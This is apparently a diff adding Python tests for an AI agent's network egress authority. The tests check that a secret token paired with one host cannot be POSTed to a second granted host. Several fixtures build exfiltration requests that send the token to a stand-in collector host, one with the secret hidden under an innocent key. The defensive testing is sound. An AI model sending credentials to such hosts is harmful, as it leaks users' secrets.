@@ -731,3 +731,107 @@ def test_the_same_grant_recorded_twice_is_still_a_replay(tmp_path):
     reloaded = NetworkAuthority(log).load()
     assert set(reloaded._grants) == {"g1"}
     assert reloaded._grants["g1"].digest() == same.digest()
+
+
+# ---- the confused deputy, checked at the boundary --------------------------
+#
+# check_egress_composition was well written, well tested, and had NO caller
+# outside its own tests -- so the defence was a function rather than a
+# boundary. Two grants that are each individually correct compose into
+# something neither permits, and nothing in the request path asked.
+
+SECRET_VALUE = "hunter2-super-secret-token-value"
+
+
+def _deputy_world():
+    """A credential for ONE host, and egress to two. Both grants legitimate."""
+    from qta_agent.secrets import (
+        SecretStore, egress_purpose, grant as sec_grant,
+    )
+
+    store = SecretStore()
+    store.register("api-token", SECRET_VALUE)
+    store.issue(sec_grant(grant_id="sg1", subject=ACTOR, task_id=TASK,
+                          tool_id=TOOL, secret_id="api-token",
+                          purposes=(egress_purpose("api.example.com"),)),
+                actor="owner")
+    net = NetworkAuthority(None)
+    for host in ("api.example.com", "collector.evil.test"):
+        net.issue(_grant(grant_id=f"g-{host}", hosts=(host,),
+                         methods=("POST",)), actor="owner")
+    return store, net
+
+
+def _post(host):
+    return _req(f"https://{host}/v1", method="POST")
+
+
+def test_a_body_carrying_a_secret_may_not_go_to_an_unpaired_host():
+    """THE PAIRING. Each grant alone is untouched; the combination is not."""
+    store, net = _deputy_world()
+    body = f'{{"token": "{SECRET_VALUE}"}}'
+    assert net.authorize(_post("api.example.com"), body=body,
+                         secrets=store).allowed
+    d = net.authorize(_post("collector.evil.test"), body=body, secrets=store)
+    assert not d.allowed
+    assert "two grants" in d.reason, d.reason
+
+
+def test_an_ordinary_body_still_reaches_a_granted_host():
+    """The guard must refuse the PAIRING, not the traffic.
+
+    A check that refused every POST to a granted host would be removed
+    rather than fixed, and then it would be protecting nothing.
+    """
+    store, net = _deputy_world()
+    assert net.authorize(_post("collector.evil.test"),
+                         body='{"hello": "world"}', secrets=store).allowed
+
+
+def test_the_pairing_is_checked_by_value_not_by_key_name():
+    """The leak that matters is a credential under an innocent name."""
+    store, net = _deputy_world()
+    sneaky = f'{{"greeting": "{SECRET_VALUE}"}}'
+    assert not net.authorize(_post("collector.evil.test"), body=sneaky,
+                             secrets=store).allowed
+
+
+def test_a_store_that_cannot_answer_does_not_become_permission():
+    """Fail-closed, and without raising out of a function documented total."""
+    _, net = _deputy_world()
+
+    class Broken:
+        def redactor(self):
+            raise RuntimeError("store is unavailable")
+
+    d = net.authorize(_post("collector.evil.test"), body="anything",
+                      secrets=Broken())
+    assert not d.allowed
+    assert "could not be consulted" in d.reason
+
+
+def test_without_a_body_the_decision_is_unchanged():
+    """Callers that pass nothing get exactly the previous behaviour."""
+    store, net = _deputy_world()
+    assert net.authorize(_post("collector.evil.test")).allowed
+    assert net.authorize(_post("collector.evil.test"),
+                         secrets=store).allowed
+
+
+def test_the_composition_check_has_a_production_caller():
+    """A defence nothing invokes is a defence that does not exist.
+
+    This is the property that was actually missing: the function was
+    correct and unreachable. Asserted structurally so it cannot quietly
+    return to being test-only.
+    """
+    import subprocess
+
+    r = subprocess.run(
+        ["git", "-C", str(ROOT), "grep", "-l", "check_egress_composition",
+         "--", "*.py"], capture_output=True, text=True)
+    files = {x.strip() for x in r.stdout.splitlines() if x.strip()}
+    production = {f for f in files if not f.startswith("tests/")}
+    assert production - {"qta_agent/secrets.py"}, (
+        "check_egress_composition is only referenced by its own module and "
+        f"by tests: {sorted(files)}")
